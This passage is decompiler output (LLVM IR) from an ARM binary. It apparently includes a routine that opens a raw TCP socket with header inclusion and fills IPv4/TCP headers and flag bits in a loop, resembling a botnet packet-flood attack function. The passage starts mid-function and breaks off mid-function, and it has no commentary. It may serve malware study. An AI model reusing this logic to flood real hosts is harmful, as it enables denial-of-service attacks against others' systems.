  store i32 %v1_bf50, i32* @r5, align 4
  br i1 %v3_be24, label %dec_label_pc_bf58, label %dec_label_pc_be38

dec_label_pc_bf58:                                ; preds = %dec_label_pc_bf38, %dec_label_pc_bdfc
  %v0_bf58 = call i32 @function_fe60()
  %v1_bf58 = trunc i32 %v0_bf58 to i8
  store i32 %v1_b8e8, i32* %lr.global-to-local, align 4
  %v4_bf60 = sdiv i32 %v0_bf58, 256
  store i32 %v4_bf60, i32* %r3.global-to-local, align 4
  store i1 %v2_be3c, i1* %cpsr_z.global-to-local, align 1
  %v3_bf68 = load i32, i32* @r4, align 4
  %v4_bf68 = add i32 %v3_bf68, 4
  %v5_bf68 = inttoptr i32 %v4_bf68 to i8*
  store i8 %v1_bf58, i8* %v5_bf68, align 1
  %v0_bf6c = load i32, i32* %r3.global-to-local, align 4
  %v1_bf6c = trunc i32 %v0_bf6c to i8
  %v2_bf6c = load i32, i32* @r4, align 4
  %v3_bf6c = add i32 %v2_bf6c, 5
  %v4_bf6c = inttoptr i32 %v3_bf6c to i8*
  store i8 %v1_bf6c, i8* %v4_bf6c, align 1
  %v0_bf70 = load i32, i32* @r4, align 4
  %v1_bf70 = add i32 %v0_bf70, 40
  store i32 %v1_bf70, i32* %r0.global-to-local, align 4
  %v0_bf74 = load i32, i32* @sb, align 4
  store i32 %v0_bf74, i32* @r1, align 4
  %v0_bf78 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bf78, label %dec_label_pc_be4c, label %dec_label_pc_bf7c

dec_label_pc_bf7c:                                ; preds = %dec_label_pc_be38, %dec_label_pc_bf58
  %v0_bf7c = phi i32 [ %v1_be40, %dec_label_pc_be38 ], [ %v1_bf70, %dec_label_pc_bf58 ]
  %v1_bf7c = inttoptr i32 %v0_bf7c to i8*
  %v2_bf7c = call i32 @function_1003c(i8* %v1_bf7c)
  store i32 %v2_bf7c, i32* %r0.global-to-local, align 4
  %v2_be4c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_be4c

; uselistorder directives
  uselistorder i32 %v0_bf70, { 1, 0 }
  uselistorder i32 %v7_bf44, { 1, 2, 0 }
  uselistorder i32 %v1_bf2c, { 1, 2, 0 }
  uselistorder i32 %v1_bf28, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_becc, { 0, 2, 1 }
  uselistorder i32 %v0_beb4, { 1, 0, 2 }
  uselistorder i32 %v3_be90, { 1, 0 }
  uselistorder i32 %v3_be70, { 3, 2, 0, 1 }
  uselistorder i32 %v2_be5c, { 0, 2, 1 }
  uselistorder i32 %v0_be40, { 1, 0 }
  uselistorder i32 %v0_bdfc, { 1, 0 }
  uselistorder i32 %v0_bdf0, { 1, 0 }
  uselistorder i1 %v3_be24, { 2, 3, 1, 0 }
  uselistorder i32 %v1_bdd8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bd2c, { 0, 2, 1 }
  uselistorder i32 %v3_bd0c, { 1, 0 }
  uselistorder i32 %v0_bce0, { 1, 0, 2 }
  uselistorder i32 %v3_bcd4, { 1, 0 }
  uselistorder i32 %v3_bc68, { 1, 0 }
  uselistorder i32 %v0_bc5c, { 1, 0 }
  uselistorder i32 %v3_bbe4, { 1, 0 }
  uselistorder i32 %v3_bbb4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_bb88, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_bb80, { 1, 0 }
  uselistorder i32 %v4_bb68, { 1, 0 }
  uselistorder i32 %v0_bb64, { 0, 2, 1 }
  uselistorder i1 %v7_bad4, { 1, 0 }
  uselistorder i32 %v7_bacc, { 0, 2, 1, 3 }
  uselistorder i32 %v5_bb18, { 1, 0 }
  uselistorder i1 %v9_bafc, { 1, 0 }
  uselistorder i32 %v4_bb10, { 1, 0 }
  uselistorder i32 %v4_bb0c, { 1, 0 }
  uselistorder i32 %v8_ba20, { 1, 2, 0, 3 }
  uselistorder i32 %v3_ba0c, { 1, 0 }
  uselistorder i32 %v0_b9fc, { 1, 0, 2, 3 }
  uselistorder i1 %v7_b984, { 1, 0 }
  uselistorder i32 %v3_b980, { 2, 1, 0, 3 }
  uselistorder i32 %v1_bd98, { 1, 0 }
  uselistorder i32 %v1_bd80, { 1, 0 }
  uselistorder i32 %v1_bd68, { 1, 0 }
  uselistorder i32 %v1_bd50, { 1, 0 }
  uselistorder i32 %v1_bd38, { 1, 0 }
  uselistorder i32 %v5_bb14, { 1, 0 }
  uselistorder i32 %v3_ba6893, { 1, 0 }
  uselistorder i1 %v2_bb2c, { 1, 0 }
  uselistorder i32 %v1_bb28, { 1, 0 }
  uselistorder i32 %v4_bb24, { 2, 0, 1 }
  uselistorder i32 %v4_bb08, { 1, 0 }
  uselistorder i1 %v3_ba50, { 1, 0 }
  uselistorder i32 %v8_b94c, { 2, 1, 0 }
  uselistorder i32 %v8_b948, { 1, 2, 0 }
  uselistorder i32 %v3_b940, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_b93c, { 0, 1, 3, 2 }
  uselistorder i1 %v7_b930, { 1, 0 }
  uselistorder i1 %v7_b900, { 1, 0 }
  uselistorder i32 %v3_b8fc, { 2, 0, 1 }
  uselistorder i32 %v3_b8f8, { 5, 6, 1, 3, 4, 7, 8, 2, 0, 9 }
  uselistorder i32 %v1_b8e8, { 1, 3, 2, 0 }
  uselistorder i32 %v1_b890, { 1, 0 }
  uselistorder i32 %v1_b850, { 1, 0 }
  uselistorder i32 %v1_b830, { 1, 0 }
  uselistorder i32 %v1_b810, { 1, 0 }
  uselistorder i32 %v1_b7d8, { 1, 0 }
  uselistorder i32 %v2_b758, { 0, 4, 5, 2, 1, 3 }
  uselistorder i32 %v2_b748, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_b72c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 16, 15 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 6, 5, 10, 7, 8, 11, 9, 19, 12, 13, 14, 15, 16, 17, 18, 23, 20, 21, 22, 24, 26, 25, 28, 27, 31, 29, 32, 33, 30, 34, 36, 35, 37, 38, 40, 39, 44, 41, 42, 43, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 18, 0, 19, 20, 17, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_bf7c, { 1, 0 }
  uselistorder label %dec_label_pc_be4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bdd4, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %.thread6, { 2, 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %dec_label_pc_bb5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ba94, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_ba44, { 1, 0 }
}

define i32 @function_bf88(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bf88:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_bf8c = urem i32 %arg1, 256
  store i32 %v1_bf8c, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_bfa4 = urem i32 %arg3, 256
  store i32 %v1_bfa4, i32* @r4, align 4
  %v2_bfa8 = call i32 @function_14294(i32 %v1_bf8c, i32 4)
  %v0_bfac = load i32, i32* @r5, align 4
  store i32 %v0_bfac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bfbc = load i32, i32* @r4, align 4
  %v5_bfc0 = inttoptr i32 %v0_bfac to i32*
  %v6_bfc0 = call i32 @function_a4e8(i32 %v0_bfbc, i32* %v5_bfc0, i32 2, i32 0)
  %v1_bfcc = urem i32 %v6_bfc0, 256
  store i32 %v1_bfcc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bfd8 = load i32, i32* @r5, align 4
  store i32 %v0_bfd8, i32* %r1.global-to-local, align 4
  %v0_bfdc = load i32, i32* @r4, align 4
  %v5_bfe0 = trunc i32 %v6_bfc0 to i8
  %v6_bfe4 = inttoptr i32 %v0_bfd8 to i32*
  %v7_bfe4 = call i32 @function_a4e8(i32 %v0_bfdc, i32* %v6_bfe4, i32 3, i32 65535)
  %v0_bfe8 = load i32, i32* @r5, align 4
  store i32 %v0_bfe8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bfe4, i32* @r8, align 4
  %v0_bff8 = load i32, i32* @r4, align 4
  %v4_bffc = inttoptr i32 %v0_bfe8 to i32*
  %v5_bffc = call i32 @function_a4e8(i32 %v0_bff8, i32* %v4_bffc, i32 4, i32 64)
  %v1_c004 = urem i32 %v5_bffc, 256
  store i32 %v1_c004, i32* %ip.global-to-local, align 4
  %v0_c008 = load i32, i32* @r5, align 4
  store i32 %v0_c008, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c014 = load i32, i32* @r4, align 4
  %v6_c01c = inttoptr i32 %v0_c008 to i32*
  %v7_c01c = call i32 @function_a4e8(i32 %v0_c014, i32* %v6_c01c, i32 5, i32 0)
  %v1_c028 = urem i32 %v7_c01c, 256
  store i32 %v1_c028, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c034 = load i32, i32* @r5, align 4
  store i32 %v0_c034, i32* %r1.global-to-local, align 4
  %v0_c038 = load i32, i32* @r4, align 4
  %v5_c040 = inttoptr i32 %v0_c034 to i32*
  %v6_c040 = call i32 @function_a4e8(i32 %v0_c038, i32* %v5_c040, i32 6, i32 65535)
  %v0_c048 = load i32, i32* @r5, align 4
  store i32 %v0_c048, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c040, i32* @r7, align 4
  %v0_c058 = load i32, i32* @r4, align 4
  %v4_c05c = inttoptr i32 %v0_c048 to i32*
  %v5_c05c = call i32 @function_a4e8(i32 %v0_c058, i32* %v4_c05c, i32 7, i32 65535)
  %v0_c064 = load i32, i32* @r5, align 4
  store i32 %v0_c064, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c05c, i32* @r6, align 4
  %v0_c074 = load i32, i32* @r4, align 4
  %v4_c078 = inttoptr i32 %v0_c064 to i32*
  %v5_c078 = call i32 @function_a4e8(i32 %v0_c074, i32* %v4_c078, i32 17, i32 65535)
  %v0_c084 = load i32, i32* @r5, align 4
  store i32 %v0_c084, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_c090 = load i32, i32* @r4, align 4
  %v5_c094 = inttoptr i32 %v0_c084 to i32*
  %v6_c094 = call i32 @function_a4e8(i32 %v0_c090, i32* %v5_c094, i32 18, i32 65535)
  %v0_c098 = load i32, i32* @r5, align 4
  store i32 %v0_c098, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c0a8 = load i32, i32* @r4, align 4
  %v5_c0ac = inttoptr i32 %v0_c098 to i32*
  %v6_c0ac = call i32 @function_a4e8(i32 %v0_c0a8, i32* %v5_c0ac, i32 11, i32 0)
  %v0_c0b0 = load i32, i32* @r5, align 4
  store i32 %v0_c0b0, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c0c0 = load i32, i32* @r4, align 4
  %v5_c0c4 = inttoptr i32 %v0_c0b0 to i32*
  %v6_c0c4 = call i32 @function_a4e8(i32 %v0_c0c0, i32* %v5_c0c4, i32 12, i32 1)
  %v0_c0c8 = load i32, i32* @r5, align 4
  store i32 %v0_c0c8, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c0d8 = load i32, i32* @r4, align 4
  %v5_c0dc = inttoptr i32 %v0_c0c8 to i32*
  %v6_c0dc = call i32 @function_a4e8(i32 %v0_c0d8, i32* %v5_c0dc, i32 13, i32 0)
  %v0_c0e0 = load i32, i32* @r5, align 4
  store i32 %v0_c0e0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c0f0 = load i32, i32* @r4, align 4
  %v5_c0f4 = inttoptr i32 %v0_c0e0 to i32*
  %v6_c0f4 = call i32 @function_a4e8(i32 %v0_c0f0, i32* %v5_c0f4, i32 14, i32 0)
  %v0_c0f8 = load i32, i32* @r5, align 4
  store i32 %v0_c0f8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c108 = load i32, i32* @r4, align 4
  %v5_c10c = inttoptr i32 %v0_c0f8 to i32*
  %v6_c10c = call i32 @function_a4e8(i32 %v0_c108, i32* %v5_c10c, i32 15, i32 0)
  %v0_c110 = load i32, i32* @r5, align 4
  store i32 %v0_c110, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c120 = load i32, i32* @r4, align 4
  %v5_c124 = inttoptr i32 %v0_c110 to i32*
  %v6_c124 = call i32 @function_a4e8(i32 %v0_c120, i32* %v5_c124, i32 16, i32 0)
  %v0_c128 = load i32, i32* @r5, align 4
  store i32 %v0_c128, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_c138 = load i32, i32* @r4, align 4
  %v5_c13c = inttoptr i32 %v0_c128 to i32*
  %v6_c13c = call i32 @function_a4e8(i32 %v0_c138, i32* %v5_c13c, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c14c = load i32, i32* @r5, align 4
  store i32 %v0_c14c, i32* %r1.global-to-local, align 4
  %v0_c150 = load i32, i32* @r4, align 4
  %v4_c154 = inttoptr i32 %v0_c14c to i32*
  %v5_c154 = call i32 @function_a4e8(i32 %v0_c150, i32* %v4_c154, i32 1, i32 1)
  %v2_c160 = load i32, i32* @global_var_1ecb8.86, align 4
  store i32 %v2_c160, i32* %r3.global-to-local, align 4
  %v1_c164 = urem i32 %v5_c154, 256
  store i32 %v1_c164, i32* %ip.global-to-local, align 4
  %v0_c168 = load i32, i32* @r5, align 4
  store i32 %v0_c168, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c170 = load i32, i32* @r4, align 4
  %v5_c178 = inttoptr i32 %v0_c168 to i32*
  %v6_c178 = call i32 @function_a47c(i32 %v0_c170, i32* %v5_c178, i32 25, i32 %v2_c160, i32 %v1_c164)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c18c = call i32 @function_13f90(i32 2, i32 3, i32 6)
  %v7_c190 = icmp eq i32 %v3_c18c, -1
  store i1 %v7_c190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c190, label %dec_label_pc_c5c8, label %dec_label_pc_c19c

dec_label_pc_c19c:                                ; preds = %dec_label_pc_bf88
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c1a4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c1a4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_c1b8 = call i32 @function_13f60(i32 %v3_c18c, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  %v7_c1bc = icmp eq i32 %v6_c1b8, -1
  store i1 %v7_c1bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c1bc, label %dec_label_pc_c5c0, label %dec_label_pc_c1c4

dec_label_pc_c1c4:                                ; preds = %dec_label_pc_c19c
  %v0_c1c4 = load i32, i32* @r8, align 4
  %v0_c1c8 = load i32, i32* @r7, align 4
  %v0_c1cc = load i32, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_c1d4 = urem i32 %v0_c1c4, 65536
  store i32 %v3_c1d4, i32* %r2.global-to-local, align 4
  %v3_c1d8 = urem i32 %v0_c1c8, 65536
  store i32 %v3_c1d8, i32* %r3.global-to-local, align 4
  %v3_c1dc = urem i32 %v0_c1cc, 65536
  store i32 %v3_c1dc, i32* %ip.global-to-local, align 4
  %v0_c1e0 = load i32, i32* @fp, align 4
  %v2_c1e0 = icmp eq i32 %v0_c1e0, 0
  store i1 %v2_c1e0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp75 = icmp slt i32 %v0_c1e0, 1
  br i1 %tmp75, label %dec_label_pc_c6e0, label %dec_label_pc_c1f8

dec_label_pc_c1f8:                                ; preds = %dec_label_pc_c1c4
  %v1_c200 = add i32 %v6_c13c, 40
  %tmp76 = mul i32 %v1_c200, 256
  %v1_c214 = urem i32 %v0_c1c8, 256
  %v1_c218 = and i32 %tmp76, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %v3_c21c = mul nuw nsw i32 %v1_c214, 256
  %v1_c224 = urem i32 %v0_c1cc, 256
  %tmp77 = udiv i32 %v0_c1cc, 256
  %v3_c228 = urem i32 %tmp77, 256
  %tmp78 = udiv i32 %v1_c200, 256
  %v4_c22c = urem i32 %tmp78, 256
  %v5_c22c = or i32 %v4_c22c, %v1_c218
  store i32 %v5_c22c, i32* @lr, align 4
  %tmp79 = udiv i32 %v0_c1c8, 256
  %v4_c230 = urem i32 %tmp79, 256
  %v5_c230 = or i32 %v4_c230, %v3_c21c
  store i32 %v5_c230, i32* @sl, align 4
  %v4_c234 = mul nuw nsw i32 %v1_c224, 256
  %v5_c234 = or i32 %v4_c234, %v3_c228
  store i32 %v5_c234, i32* @r6, align 4
  %tmp80 = udiv i32 %v0_c1c4, 256
  %v3_c244 = urem i32 %tmp80, 256
  %v1_c248 = urem i32 %v0_c1c4, 256
  %tmp81 = mul i32 %v5_c078, 256
  %v1_c250 = and i32 %tmp81, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %v1_c254 = urem i32 %v6_c0ac, 2
  %v1_c258 = urem i32 %v6_c0c4, 2
  %v1_c25c = urem i32 %v6_c0dc, 2
  %tmp82 = udiv i32 %v5_c078, 256
  %v4_c260 = urem i32 %tmp82, 256
  %v5_c260 = or i32 %v4_c260, %v1_c250
  store i32 %v5_c260, i32* @r8, align 4
  %v1_c280 = urem i32 %v6_c0f4, 2
  %v1_c284 = urem i32 %v6_c10c, 2
  %v1_c288 = urem i32 %v6_c124, 2
  %v1_c28c = urem i32 %v6_c0dc, 256
  %v4_c290 = mul nuw nsw i32 %v1_c248, 256
  %v5_c290 = or i32 %v4_c290, %v3_c244
  store i32 %v5_c290, i32* @r5, align 4
  %v3_c2a425 = udiv i32 %v1_c218, 256
  store i32 %v3_c2a425, i32* %r3.global-to-local, align 4
  store i32 %v1_c248, i32* %ip.global-to-local, align 4
  store i32 %v1_c214, i32* %r1.global-to-local, align 4
  store i32 %v1_c224, i32* %r2.global-to-local, align 4
  %v5_c2c0 = trunc i32 %v0_c1c8 to i8
  store i32 0, i32* @r4, align 4
  %sext8 = mul i32 %v5_bffc, 16777216
  %v4_c31c = sdiv i32 %sext8, 16777216
  %sext9 = mul i32 %v0_c1c4, 16777216
  %v4_c328 = sdiv i32 %sext9, 16777216
  %sext10 = mul i32 %tmp78, 16777216
  %v4_c33c = sdiv i32 %sext10, 16777216
  %sext11 = mul i32 %v1_c218, 65536
  %v4_c340 = sdiv i32 %sext11, 16777216
  %tmp = sub nsw i32 0, %v1_c254
  %v4_c390 = and i32 %tmp, 32
  %tmp93 = sub nsw i32 0, %v1_c258
  %v4_c3a4 = and i32 %tmp93, 16
  %tmp94 = sub nsw i32 0, %v1_c25c
  %v4_c3b8 = and i32 %tmp94, 8
  %tmp95 = sub nsw i32 0, %v1_c280
  %v4_c3cc = and i32 %tmp95, 4
  %tmp96 = sub nsw i32 0, %v1_c284
  %v3_c3e0 = and i32 %tmp96, 2
  %sext12 = mul i32 %v0_c1cc, 16777216
  %v7_c410 = sdiv i32 %sext12, 16777216
  %v1_c324 = trunc i32 %v4_c31c to i8
  %extract.t = trunc i32 %v4_c328 to i8
  %v3_c410 = sext i8 %v5_c2c0 to i32
  %v2_c434 = icmp eq i32 %v1_c28c, 0
  br label %dec_label_pc_c2cc

dec_label_pc_c2cc:                                ; preds = %bb89, %dec_label_pc_c1f8
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_c2d8 = call i32 @function_14294(i32 1510, i32 1)
  store i32 %v2_bfa8, i32* %ip.global-to-local, align 4
  %v2_c2e4 = load i32, i32* @r4, align 4
  %v5_c2e4 = mul i32 %v2_c2e4, 4
  %v6_c2e4 = add i32 %v5_c2e4, %v2_bfa8
  %v7_c2e4 = inttoptr i32 %v6_c2e4 to i32*
  store i32 %v2_c2d8, i32* %v7_c2e4, align 4
  %v3_c2e8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c2e8, i32* %r3.global-to-local, align 4
  %v0_c2ec = load i32, i32* %ip.global-to-local, align 4
  %v4_c2ec = mul i32 %v3_c2e8, 4
  %v5_c2ec = add i32 %v0_c2ec, %v4_c2ec
  %v6_c2ec = inttoptr i32 %v5_c2ec to i32*
  %v7_c2ec = load i32, i32* %v6_c2ec, align 4
  store i32 %v7_c2ec, i32* @r7, align 4
  %v1_c2f0 = inttoptr i32 %v7_c2ec to i8*
  %v2_c2f0 = load i8, i8* %v1_c2f0, align 1
  %tmp97 = urem i8 %v2_c2f0, 16
  %v1_c2f4 = zext i8 %tmp97 to i32
  %v1_c2f8 = or i32 %v1_c2f4, 64
  store i32 %v1_c2f8, i32* %r2.global-to-local, align 4
  %v1_c2fc = trunc i32 %v1_c2f8 to i8
  store i8 %v1_c2fc, i8* %v1_c2f0, align 1
  %v0_c300 = load i32, i32* @r7, align 4
  %v1_c300 = inttoptr i32 %v0_c300 to i8*
  %v2_c300 = load i8, i8* %v1_c300, align 1
  %v1_c304 = and i8 %v2_c300, -16
  %v1_c308 = or i8 %v1_c304, 5
  store i32 %v1_c028, i32* %r1.global-to-local, align 4
  store i8 %v1_c308, i8* %v1_c300, align 1
  %v2_c318 = load i32, i32* @r7, align 4
  %v3_c318 = add i32 %v2_c318, 1
  %v4_c318 = inttoptr i32 %v3_c318 to i8*
  store i8 %v5_bfe0, i8* %v4_c318, align 1
  store i32 %v4_c31c, i32* %r3.global-to-local, align 4
  %v0_c320 = load i32, i32* %r1.global-to-local, align 4
  %v2_c320 = icmp eq i32 %v0_c320, 0
  store i1 %v2_c320, i1* %cpsr_z.global-to-local, align 1
  %v2_c324 = load i32, i32* @r7, align 4
  %v3_c324 = add i32 %v2_c324, 8
  %v4_c324 = inttoptr i32 %v3_c324 to i8*
  store i8 %v1_c324, i8* %v4_c324, align 1
  store i32 %v4_c328, i32* %r2.global-to-local, align 4
  %v0_c32c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c32c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c2cc
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c330 = load i32, i32* @r7, align 4
  %v4_c330 = add i32 %v3_c330, 6
  %v5_c330 = inttoptr i32 %v4_c330 to i8*
  store i8 64, i8* %v5_c330, align 1
  %v0_c338.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t26 = trunc i32 %v0_c338.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c2cc, %bb
  %v0_c338.off0 = phi i8 [ %extract.t, %dec_label_pc_c2cc ], [ %extract.t26, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_c338 = load i32, i32* @r7, align 4
  %v3_c338 = add i32 %v2_c338, 5
  %v4_c338 = inttoptr i32 %v3_c338 to i8*
  store i8 %v0_c338.off0, i8* %v4_c338, align 1
  store i32 %v4_c33c, i32* %ip.global-to-local, align 4
  store i32 %v4_c340, i32* %r1.global-to-local, align 4
  %v0_c344 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c344, label %bb84, label %bb83

bb83:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %.thread, %bb83
  %v0_c348 = load i32, i32* %r3.global-to-local, align 4
  %v1_c348 = trunc i32 %v0_c348 to i8
  %v2_c348 = load i32, i32* @r7, align 4
  %v3_c348 = add i32 %v2_c348, 9
  %v4_c348 = inttoptr i32 %v3_c348 to i8*
  store i8 %v1_c348, i8* %v4_c348, align 1
  %v0_c34c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c34c, label %bb86, label %bb85

bb85:                                             ; preds = %bb84
  %v1_c34c = load i32, i32* %r2.global-to-local, align 4
  %v2_c34c = trunc i32 %v1_c34c to i8
  %v3_c34c = load i32, i32* @r7, align 4
  %v4_c34c = add i32 %v3_c34c, 7
  %v5_c34c = inttoptr i32 %v4_c34c to i8*
  store i8 %v2_c34c, i8* %v5_c34c, align 1
  br label %bb86

bb86:                                             ; preds = %bb84, %bb85
  %v3_c350 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c350, i32* %r2.global-to-local, align 4
  %v0_c354 = load i32, i32* %ip.global-to-local, align 4
  %v1_c354 = trunc i32 %v0_c354 to i8
  %v2_c354 = load i32, i32* @r7, align 4
  %v3_c354 = add i32 %v2_c354, 2
  %v4_c354 = inttoptr i32 %v3_c354 to i8*
  store i8 %v1_c354, i8* %v4_c354, align 1
  store i32 %v6_c178, i32* %ip.global-to-local, align 4
  %v0_c35c = load i32, i32* %r2.global-to-local, align 4
  %v3_c35c = mul i32 %v0_c35c, 32
  store i32 %v3_c35c, i32* %r3.global-to-local, align 4
  %v1_c360 = load i32, i32* @r7, align 4
  %v2_c360 = add i32 %v1_c360, 12
  %v3_c360 = inttoptr i32 %v2_c360 to i32*
  store i32 %v6_c178, i32* %v3_c360, align 4
  %v0_c364 = load i32, i32* %r3.global-to-local, align 4
  %v1_c364 = load i32, i32* %r2.global-to-local, align 4
  %tmp98 = mul i32 %v1_c364, -8
  %v5_c364 = add i32 %v0_c364, %tmp98
  %v1_c368 = load i32, i32* @sb, align 4
  %v2_c368 = add i32 %v1_c368, %v5_c364
  store i32 %v2_c368, i32* %r3.global-to-local, align 4
  %v1_c36c = add i32 %v2_c368, 16
  %v2_c36c = inttoptr i32 %v1_c36c to i32*
  %v3_c36c = load i32, i32* %v2_c36c, align 4
  store i32 %v3_c36c, i32* %r2.global-to-local, align 4
  %v0_c370 = load i32, i32* %r1.global-to-local, align 4
  %v1_c370 = trunc i32 %v0_c370 to i8
  %v2_c370 = load i32, i32* @r7, align 4
  %v3_c370 = add i32 %v2_c370, 3
  %v4_c370 = inttoptr i32 %v3_c370 to i8*
  store i8 %v1_c370, i8* %v4_c370, align 1
  %v0_c374 = load i32, i32* @r5, align 4
  %v1_c374 = trunc i32 %v0_c374 to i8
  %v2_c374 = load i32, i32* @r7, align 4
